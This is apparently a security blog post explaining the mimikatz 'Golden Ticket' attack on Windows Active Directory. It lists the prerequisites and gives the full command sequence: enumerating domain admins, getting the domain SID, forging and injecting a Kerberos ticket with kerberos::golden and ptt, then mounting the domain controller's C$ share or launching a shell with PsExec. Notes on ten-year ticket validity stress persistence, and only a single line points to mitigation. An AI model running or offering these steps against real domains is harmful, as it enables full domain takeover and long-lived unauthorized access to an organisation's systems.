Introduction<br/>
We have a new feature again in mimikatz called Golden Ticket provided by Benjamin Delpy aka gentilkiwi. With this technique, we can basically access any resource in the domain.<br/>
<br/>
Here is the list of what you need to make it work:<br/>
&nbsp;krbtgt user's NTLM hash (e.g. from a previous NTDS.DIT dump)<br/>
&nbsp;Domain name<br/>
&nbsp;Domain's SID<br/>
&nbsp;Username that we'd like to impersonate<br/>
<br/>
As you can see, exploiting this architectural flaw is not trivial, because we need the NTLM hash of the krbtgt user and that requires hacking a Domain Controller first. But once that is done we can play with it for some time, because the hash of the krbtgt user will not change for a while.<br/>
As you know mimikatz can dump and replay the existing tickets on Windows, so when we got access to a server or workstation and dumped the tickets we can easily replay those on another computer and get access to the same resource. See Google for more info.<br/>
<br/>
<br/>
Attack<br/>
<br/>
When we have everything from the list above, we can create a new TGT ticket with mimikatz and grant access to anything in the domain. Let's see an example:<br/>
<br/>
First we look for a domain administrator:<br/>
C:\Users\evilhacker&gt;net group "domain admins" /domain<br/>
Now let's get the Domain SID. Easiest way to do that is just use: "whoami /user" and remove the last part of the SID, or if we have PsTools then PsGetsid.exe come in handy:<br/>
C:\Users\evilhacker\Documents\mimikatz&gt;PsGetsid.exe CTU.DOMAIN<br/>
Now we have everything to start the attack. First we list the existing Kerberos tickets, if there is any we can those with the purge command (but it is not necessary) and then we can create the Golden Ticket and pass that.<br/>
C:\Users\evilhacker\Documents\mimikatz&gt;mimikatz.exe<br/>
mimikatz # kerberos::list<br/>
mimikatz # kerberos::purge<br/>
mimikatz # kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi<br/>
mimikatz # kerberos::ptt Administrator.kiribi<br/>
mimikatz # kerberos::list<br/>
mimikatz # kerberos::tgt<br/>
Now you can mount any share or use any RPC related tool that you like.<br/>
C:\Users\evilhacker\Documents\mimikatz&gt;net use i: \\dc01.ctu.domain\c$<br/>
C:\Users\evilhacker\Documents\mimikatz&gt;net use<br/>
New connections will be remembered.<br/>
OR<br/>
C:\Users\evilhacker\Documents\pstools&gt;PsExec.exe \\dc01.ctu.domain\ cmd.exe<br/>
<br/>
<br/>
Some additional notes:<br/>
Password change on behalf of the user does not have any impact on the ticket, the access can be granted without the user's password (or hash)<br/>
Mimikatz does not support other user than a Domain Admin (it is hardcoded in the source), by the way I managed to impersonate a domain controller //with some malfunctions.<br/>
The TGT ticket is issued for 10 years and can be renewed for more 10 years<br/>
Existing sessions cannot be overridden. Already attached shares have to be detached first and reattached again.<br/>
Cached tickets sometimes cannot be purged so the computer has to be restarted (for example if there is a group policy that attaches different shares then those shares cannot be mounted as the impersonated user)<br/>
Mimikatz does not require SE_DEBUG or other privilege to create and pass TGT<br/>
<br/>
Mitigation<br/>
<br/>
A good mitigation how-to from CERT-EU: Protection from Kerberos Golden Ticket<br/>
